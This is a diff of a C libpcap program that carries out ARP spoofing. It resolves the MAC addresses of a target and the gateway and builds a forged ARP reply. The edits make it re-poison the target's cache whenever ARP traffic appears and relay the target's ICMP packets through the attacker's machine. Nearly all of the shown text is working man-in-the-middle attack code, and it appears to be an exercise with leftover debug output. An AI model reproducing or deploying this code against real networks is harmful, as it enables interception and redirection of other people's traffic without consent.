@@ -80,10 +80,13 @@ int main(int argc, char ** argv) {
         packet[19] = 4;
         packet[20] = 0;
         packet[21] = 1; // ARP Request
-        packet[28] = (tipNum)&0xff;
-        packet[29] = ((tipNum)>>8)&0xff;
-        packet[30] = ((tipNum)>>16)&0xff;
-        packet[31] = ((tipNum)>>24)&0xff;
+        for(i=22; i<28; i++) {
+            packet[i] = mac[i-22];
+        }
+        packet[28] = (sipNum)&0xff;
+        packet[29] = ((sipNum)>>8)&0xff;
+        packet[30] = ((sipNum)>>16)&0xff;
+        packet[31] = ((sipNum)>>24)&0xff;
         packet[32] = 0;
         packet[33] = 0;
         packet[34] = 0;
@@ -113,27 +116,6 @@ int main(int argc, char ** argv) {
 
         while(1) {
             res = pcap_next_ex(handle, &header, &packet2); // header : 패킷이 잡힌 시간, 길이 정보
-            printf("Hel");
-            if (res == 0 || packet == NULL)
-                continue;
-            if (res == -1 || res == -2) // Error while grabbing packet.
-                break; // I edited it.
-            printf("Jacked a packet with length of [%d]\n", (*header).len);
-            for(i=0; i<6; i++) {
-                gatemac[i] = packet2[i+6];
-            }
-            for(i=0; i<6; i++) {
-                printf("%x ", gatemac[i]);
-            }
-            break;
-        }
-
-        if (pcap_sendpacket(handle, packet, 42) != 0) {
-            printf( "Couldn't send packet\n");
-            return(2);
-        }
-        while(1) {
-            res = pcap_next_ex(handle, &header, &packet2); // header : 패킷이 잡힌 시간, 길이 정보
             if (res == 0 || packet == NULL)
                 continue;
             if (res == -1 || res == -2) // Error while grabbing packet.
@@ -142,11 +124,58 @@ int main(int argc, char ** argv) {
             for(i=0; i<6; i++) {
                 targetmac[i] = packet2[i+6];
             }
+            break;
+        }
+
+        for(i=0; i<6; i++) {
+            packet[i] = 255;
+        }
+        for(i=6; i<12; i++) {
+            packet[i] = mac[i-6];
+        }
+        packet[12] = 8;
+        packet[13] = 6;
+        packet[14] = 0;
+        packet[15] = 1;
+        packet[16] = 8;
+        packet[17] = 0;
+        packet[18] = 6;
+        packet[19] = 4;
+        packet[20] = 0;
+        packet[21] = 1; // ARP Request
+        for(i=22; i<28; i++) {
+            packet[i] = mac[i-22];
+        }
+        packet[28] = (tipNum)&0xff;
+        packet[29] = ((tipNum)>>8)&0xff;
+        packet[30] = ((tipNum)>>16)&0xff;
+        packet[31] = ((tipNum)>>24)&0xff;
+        for(i=32; i<38; i++) {
+            packet[i] = 0;
+        }
+        packet[38] = (sipNum)&0xff;
+        packet[39] = ((sipNum)>>8)&0xff;
+        packet[40] = ((sipNum)>>16)&0xff;
+        packet[41] = ((sipNum)>>24)&0xff;
+        if (pcap_sendpacket(handle, packet, 42) != 0) {
+            printf( "Couldn't send packet\n");
+            return(2);
+        }
+
+        while(1) {
+            res = pcap_next_ex(handle, &header, &packet2); // header : 패킷이 잡힌 시간, 길이 정보
+            printf("res : %d", res);
+            if (res == 0 || packet == NULL)
+                continue;
+            if (res == -1 || res == -2) // Error while grabbing packet.
+                break; // I edited it.
+            printf("Jacked a packet with length of [%d]\n", (*header).len);
             for(i=0; i<6; i++) {
-                printf("%x ", targetmac[i]);
+                gatemac[i] = packet2[i+6];
             }
             break;
         }
+        printf("Helloworld\n");
     // Arp Reply
         for(i=0; i<6; i++) {
             packet[i] = targetmac[i];
@@ -179,6 +208,7 @@ int main(int argc, char ** argv) {
         packet[40] = ((tipNum)>>16)&0xff;
         packet[41] = ((tipNum)>>24)&0xff;
 
+        printf("%d", sizeof(packet));
         memcpy(arp_packet, packet, sizeof(packet));
 /*
         while(1)
@@ -192,7 +222,7 @@ int main(int argc, char ** argv) {
             return(2);
         }
 
-        if(pcap_compile(handle, &fp, "icmp", 0, net) == -1) {
+        if(pcap_compile(handle, &fp, "icmp||arp", 0, net) == -1) {
             fprintf(stderr, "Couldn't parse filter %s\n", filter_exp, pcap_geterr(handle));
             return (2);
         }
@@ -209,16 +239,24 @@ int main(int argc, char ** argv) {
             if( res ==-1 || res == -2)
                 break;
             printf("Jacked a packet with length of [%d]\n", (*header).len);
+            if(packet2[12] ==0x8 && packet2[13] == 0x6) {
+                if(pcap_sendpacket(handle, arp_packet, 100) != 0 ) {
+                    printf("Couldn't send packet\n");
+                    return(2);
+                }
+                printf("ARP Modified Again\n");
+                continue;
+            }
 
             for(i=0; i<6; i++) {
                 packet2[i] = gatemac[i];
             }
 
-            for(i=0;i<6;i++) {
-                packet2[i+6] = mac[i];
+            for(i=6;i<12;i++) {
+                packet2[i] = mac[i-6];
             }
 
-            if(pcap_sendpacket(handle, packet2, sizeof(packet2)) != 0 ) {
+            if(pcap_sendpacket(handle, packet2, 100) != 0 ) {
                 printf("Couldn't send packet\n");
                 return(2);
             }
